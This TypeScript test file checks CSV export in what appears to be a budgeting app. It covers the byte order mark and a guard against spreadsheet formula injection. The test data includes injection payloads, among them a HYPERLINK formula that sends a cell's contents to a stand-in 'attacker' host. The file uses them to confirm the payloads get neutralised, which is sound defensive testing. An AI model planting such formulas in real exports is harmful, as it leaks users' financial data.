import { mkdtemp, rm, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';

import { parse as csvParse } from 'csv-parse/sync';

import * as db from '#server/db';
import { loadMappings } from '#server/db/mappings';
import { parseFile } from '#server/transactions/import/parse-file';
import { q } from '#shared/query';

import { exportQueryToCSV, exportToCSV } from './export-to-csv';

const UTF8_BOM = '\uFEFF';

function parseCsv(csv: string) {
  // columns: true produces string-keyed records with string values (no casting).
  // The parser returns unknown[], so satisfies cannot narrow the result.
  return csvParse(csv, { columns: true, bom: true }) as Array<
    Record<string, string>
  >;
}

describe('exportToCSV', () => {
  const accounts = [{ id: 'a1', name: 'Checking' }];
  const categoryGroups = [
    { name: 'Income', categories: [{ id: 'c1', name: 'Salary' }] },
  ];

  function makeTransaction(overrides: Record<string, unknown> = {}) {
    return {
      account: 'a1',
      date: '2026-01-01',
      payee: 'p1',
      notes: '',
      category: 'c1',
      amount: 10000,
      cleared: false,
      reconciled: false,
      ...overrides,
    };
  }

  async function payeeCell(payeeName: string, amount = 10000) {
    const csv = await exportToCSV(
      [makeTransaction({ amount })],
      accounts,
      categoryGroups,
      [{ id: 'p1', name: payeeName }],
    );
    return { row: parseCsv(csv)[0], csv };
  }

  it.each([
    ['=HYPERLINK("http://attacker/?d="&B2,"x")'],
    ['=1+1'],
    ['+1+1'],
    ['-2+3'],
    ['@SUM(1+1)'],
    ['\tHELLO'],
    ['\rHELLO'],
  ])('prefixes a payee starting with %j with a single quote', async payload => {
    const { row } = await payeeCell(payload);
    expect(row.Payee).toBe("'" + payload);
  });

  it('does not prefix payees without a leading trigger character', async () => {
    const { row } = await payeeCell('Acme Corp');
    expect(row.Payee).toBe('Acme Corp');
  });

  it('does not prefix negative numeric amounts', async () => {
    const { row } = await payeeCell('Acme', -2500);
    expect(row.Amount).toBe('-25');
  });

  it('does not add a byte order mark to the string API consumers receive', async () => {
    const { csv } = await payeeCell('Optométriste');
    expect(csv.startsWith('Account,')).toBe(true);
  });
});

describe('exportQueryToCSV', () => {
  const accountId = 'acct-1';

  beforeEach(async () => {
    await global.emptyDatabase()();
    await loadMappings();
    await db.insertAccount({ id: accountId, name: 'Compte Chèque' });
  });

  async function insertTransaction(notes: string | null, date = '2026-01-15') {
    await db.insertTransaction({
      account: accountId,
      amount: -2500,
      date,
      notes,
    });
  }

  function exportAll() {
    return exportQueryToCSV(q('transactions').orderBy('date'));
  }

  // Excel assumes the system ANSI code page for a CSV unless a BOM says it is
  // UTF-8, which turns "À" into "Ã€" (issue #9469).
  it.each(['Virement Interac À : Optométriste Vêtement', 'Plain ascii'])(
    'starts with one UTF-8 byte order mark when notes are %j',
    async notes => {
      await insertTransaction(notes);

      const csv = await exportAll();

      expect(csv.startsWith(UTF8_BOM + 'Account,')).toBe(true);
      expect(csv.lastIndexOf(UTF8_BOM)).toBe(0);
    },
  );

  it('exports only the byte order mark when no transactions match', async () => {
    expect(await exportAll()).toBe(UTF8_BOM);
  });

  it('keeps accented values, null notes and the formula guard', async () => {
    await insertTransaction('Vêtement À é');
    await insertTransaction(null, '2026-01-16');
    await insertTransaction('=1+1', '2026-01-17');

    const rows = parseCsv(await exportAll());

    expect(rows.map(row => row.Notes)).toEqual(['Vêtement À é', '', "'=1+1"]);
    expect(rows[0].Account).toBe('Compte Chèque');
  });

  it('can be imported back without corrupting the first column', async () => {
    await insertTransaction('Optométriste');
    const directory = await mkdtemp(join(tmpdir(), 'actual-csv-export-'));

    try {
      const filepath = join(directory, 'export.csv');
      await writeFile(filepath, await exportAll());

      const { errors, transactions } = await parseFile(filepath, {
        hasHeaderRow: true,
      });

      expect(errors).toEqual([]);
      expect(transactions?.[0]).toMatchObject({
        Account: 'Compte Chèque',
        Notes: 'Optométriste',
      });
    } finally {
      await rm(directory, { recursive: true });
    }
  });
});
